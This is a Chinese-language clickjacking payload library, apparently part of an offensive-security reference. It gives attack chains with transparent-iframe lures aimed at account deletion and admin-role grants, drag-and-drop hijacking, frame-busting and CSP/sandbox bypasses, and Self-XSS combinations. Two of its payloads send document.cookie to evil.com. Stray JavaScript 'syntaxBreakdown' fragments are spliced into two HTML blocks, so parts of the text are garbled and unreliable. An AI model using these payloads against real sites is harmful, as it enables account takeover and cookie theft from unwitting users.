# 点击劫持 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:基础点击劫持(iframe 嵌套) / 点击劫持 + XSS 组合。任何敏感操作页缺失 `X-Frame-Options` / CSP `frame-ancestors` 都试。

---


### 基础点击劫持  `clickjacking-basic`
通过透明iframe覆盖诱使用户在不知情的情况下点击隐藏的恶意按钮或链接
子类：**基础** · tags: `clickjacking` `ui-redressing` `iframe`

**前置条件：** 目标站点允许被iframe嵌套；目标未设置X-Frame-Options响应头；目标未配置CSP frame-ancestors策略；HTML/CSS基础知识

**攻击链：**

**1. 检测X-Frame-Options和CSP**  _[linux]_
_检查目标是否设置了防点击劫持的安全头_
```
curl -sI "http://target.com" | grep -iE "x-frame-options|content-security-policy|frame-ancestors"

# 批量检测:
for url in $(cat urls.txt); do
  echo -n "$url: "
  xfo=$(curl -sI "$url" | grep -i "x-frame-options")
  csp=$(curl -sI "$url" | grep -i "frame-ancestors")
  [ -z "$xfo" ] && [ -z "$csp" ] && echo "VULNERABLE" || echo "Protected: $xfo $csp"
done
```

**2. 基础透明iframe覆盖POC**
_构造诱饵页面，将目标敏感操作页面以透明iframe覆盖在诱饵按钮上方_
```
<html>
<head><title>Win a Prize!</title>
<style>
  #target-frame {
    position: absolute; top: 0; left: 0;
    width: 500px; height: 500px;
    opacity: 0.0001; /* 近乎完全透明 */
    z-index: 2; border: none;
  }
  #decoy-btn {
    position: absolute; top: 120px; left: 50px;
    z-index: 1; padding: 15px 30px;
    font-size: 20px; cursor: pointer;
    background: #4CAF50; color: white;
    border: none; border-radius: 5px;
  }
</style></head>
<body>
  <h1>Congratulations! You Won!</h1>
  <p>Click the button to claim your prize:</p>
  <button id="decoy-btn">Claim Prize</button>
  <iframe id="target-frame" src="http://target.com/account/delete"></iframe>
</body></html>
```

**3. 多步骤拖拽劫持(Drag-and-Drop)**
_利用HTML5拖拽API实现跨域数据提取型点击劫持_
```
<html>
<head><style>
  #source { width:200px; height:50px; background:#eee; text-align:center; line-height:50px; }
  #target-frame { position:absolute; top:0; left:0; width:600px; height:400px; opacity:0.0001; z-index:10; }
</style>
<script>
  // 监听拖拽事件，可以跨域提取数据
  document.addEventListener("drag", function(e) {
    console.log("Dragging:", e.dataTransfer.getData("text"));
  });
</script></head>
<body>
  <div id="source" draggable="true">Drag this to win!</div>
  <div id="drop-zone" style="width:200px;height:200px;border:2px dashed #ccc;margin-top:20px;">Drop Here</div>
  <iframe id="target-frame" src="http://target.com/profile" sandbox="allow-scripts allow-forms"></iframe>
</body></html>
```

**4. 利用CSS pointer-events绕过**
_使用pointer-events:none使覆盖层不拦截点击，点击直接穿透到下层iframe_
```
<style>
  .overlay { pointer-events: none; position: absolute; z-index: 100; }
  iframe { pointer-events: auto; position: absolute; opacity: 0; }
</style>
<div class="overlay">
  <h1>Survey: Rate Our Service</h1>
  <p>Select your rating below:</p>
  <!-- 诱饵内容完全不拦截鼠标事件 -->
  <div style="display:flex; gap:20px; margin-top:50px;">
    <span style="font-size:40px">⭐</span>
    <span style="font-size:40px">⭐⭐</span>
    <span style="font-size:40px">⭐⭐⭐</span>
  </div>
</div>
<iframe src="http://target.com/admin/grant-role?role=admin&user=attacker" style="width:100%;height:100%;border:none;"></iframe>
```

**WAF/EDR 绕过变体：**

**1. iframe sandbox属性绕过**
_通过iframe sandbox属性的allow-top-navigation和allow-scripts组合绕过部分frame-busting脚本_
```
<iframe src="https://target.com" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>

<!-- 利用sandbox allow-top-navigation绕过 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation allow-forms"></iframe>

<!-- 利用sandbox+srcdoc绕过 -->
<iframe srcdoc="<script>top.location='https://target.com'</script>" sandbox="allow-scripts allow-top-navigation"></iframe>
```

**2. X-Frame-Options ALLOW-FROM不一致**
_X-Frame-Options ALLOW-FROM在不同浏览器中表现不一致，Chrome/Safari完全忽略此指令_
```
<!-- 利用浏览器对ALLOW-FROM支持不一致 -->
<!-- Chrome/Safari忽略ALLOW-FROM，仅CSP frame-ancestors生效 -->

<!-- 双重iframe绕过frame-busting -->
<iframe src="data:text/html,<iframe src='https://target.com'></iframe>"></iframe>

<!-- 利用window.name绕过 -->
<iframe src="attacker-page.html" name="payload_data"></iframe>
```

**3. 双重嵌套iframe绕过**
_通过双重嵌套iframe使frame-busting脚本中的top引用指向中间页而非攻击页_
```
<!-- 双重嵌套绕过frame-busting -->
<iframe src="middle-page.html"></iframe>

<!-- middle-page.html内容 -->
<html><body>,
          syntaxBreakdown: [
            { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
            { part: '<iframe>', explanation: { zh: '内嵌框架', en: 'Inline frame (iframe)' }, type: 'tag' }
          ]
<iframe src="https://target.com" sandbox="allow-forms"></iframe>
</body></html>

<!-- onbeforeunload阻止跳转 -->
<script>window.onbeforeunload=function(){return "x";}</script>
<iframe src="https://target.com"></iframe>
```

---

### 点击劫持+XSS  `clickjacking-xss`
将点击劫持与XSS攻击结合，先通过点击劫持触发XSS攻击向量获取更深层的控制
子类：**XSS** · tags: `clickjacking` `xss`

**前置条件：** 目标存在XSS漏洞；目标允许被iframe嵌套；XSS payload可被点击触发

**攻击链：**

**1. 识别可利用的XSS和Clickjacking组合**
_同时检测目标的点击劫持和XSS漏洞_
```
# 1. 检测iframe嵌套防护
curl -sI "http://target.com" | grep -i "x-frame-options|frame-ancestors"

# 2. 检测已知XSS点
curl -s "http://target.com/search?q=<script>alert(1)</script>" | grep -i "script"

# 3. 检测Self-XSS (需要用户交互)
curl -s "http://target.com/profile/edit" -d "bio=<img+src=x+onerror=alert(document.cookie)>"
```

**2. Self-XSS + Clickjacking组合利用**
_利用多步骤点击劫持触发Self-XSS——先引导用户点击编辑按钮，再诱导粘贴XSS payload_
```
<html><head>
<style>
  iframe { position:absolute; top:0; left:0; width:800px; height:600px; opacity:0.0001; z-index:10; }
  .step { position:absolute; z-index:1; }
</style>
<script>
var step = 0;
function nextStep() {
  step++;
  if (step === 1) {
    // 第一步：诱导用户点击"个人records编辑"按钮
    document.getElementById("msg").innerText = "Step 1: Click to claim reward!";
  } else if (step === 2) {
    // 第二步：诱导用户点击输入框
    document.getElementById("msg").innerText = "Step 2: Click to verify identity!";
  } else if (step === 3) {
    // 第三步：诱导粘贴(Ctrl+V)，执行XSS
    document.getElementById("msg").innerText = "Step 3: Press Ctrl+V to paste verification code!";
    navigator.clipboard.writeText('<img src=x onerror="fetch('https://evil.com/steal?'+document.cookie)">');
  }
}
</script></head>
<body onload="nextStep()">
  <h1 id="msg">Loading prize...</h1>
  <button class="step" onclick="nextStep()" style="top:200px;left:100px;">Next Step</button>
  <iframe src="http://target.com/profile/edit"></iframe>
</body></html>
```

**3. 反射型XSS + iframe嵌套利用**
_将含有XSS payload的URL通过iframe加载，利用点击劫持触发需要用户交互的XSS_
```
<html><head>
<style>
  iframe { width:100%; height:100%; position:absolute; top:0; left:0; opacity:0; border:none; }
</style></head>
<body>
  <h1>Free WiFi Login</h1>
  <p>Please click "Connect" to access free WiFi</p>
  <button style="padding:15px 40px; font-size:18px; margin-top:20px;">Connect</button>
  <!-- iframe加载含XSS的URL，按钮位置精确对齐触发XSS -->
  <iframe src="http://target.com/page?callback=<script>document.location='https://evil.com/steal?c='+document.cookie</script>"></iframe>
</body></html>
```

**WAF/EDR 绕过变体：**

**1. CSP frame-ancestors绕过**
_利用data:/blob: URI和srcdoc属性绕过CSP中frame-ancestors指令对iframe内容的限制_
```
<!-- 利用data: URI绕过CSP（旧浏览器） -->
<iframe src="data:text/html,<script>alert(document.domain)</script>"></iframe>

<!-- blob: URI绕过 -->
<script>
var blob = new Blob(['<script>alert(1)<\/script>'], {type: 'text/html'});
document.getElementById('frame').src = URL.createObjectURL(blob);
</script>

<!-- srcdoc属性绕过 -->
<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
```

**2. sandbox属性配置错误利用**
_利用sandbox属性中allow-scripts与allow-same-origin组合或allow-popups-to-escape-sandbox逃逸沙箱_
```
<!-- sandbox allow-scripts允许执行JS -->
<iframe src="https://target.com" sandbox="allow-scripts allow-same-origin">
</iframe>,
          syntaxBreakdown: [
            { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
            { part: '<iframe>', explanation: { zh: '内嵌框架', en: 'Inline frame (iframe)' }, type: 'tag' },
            { part: 'alert()', explanation: { zh: '弹窗函数', en: 'Alert function' }, type: 'function' }
          ]

<!-- 利用allow-popups逃逸 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox">
</iframe>

<!-- allow-top-navigation + 点击劫持 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation-by-user-activation">
</iframe>
```

**3. 拖放劫持注入XSS**
_通过HTML5拖放API将XSS payload从攻击页面拖入目标iframe中的可编辑区域_
```
<!-- 拖放劫持将XSS payload注入目标页面 -->
<style>
#drag { position: absolute; z-index: 1; opacity: 0; }
#target { position: absolute; z-index: 0; }
</style>

<div id="drag" draggable="true"
  ondragstart="event.dataTransfer.setData('text/html','<img src=x onerror=alert(1)>')">
  Drag me
</div>

<iframe id="target" src="https://target.com/page-with-editable-field"
  sandbox="allow-scripts allow-same-origin">
</iframe>
```

---

---

← 回 [00-index.md](00-index.md) · 相关:[`10-csrf.md`](10-csrf.md)
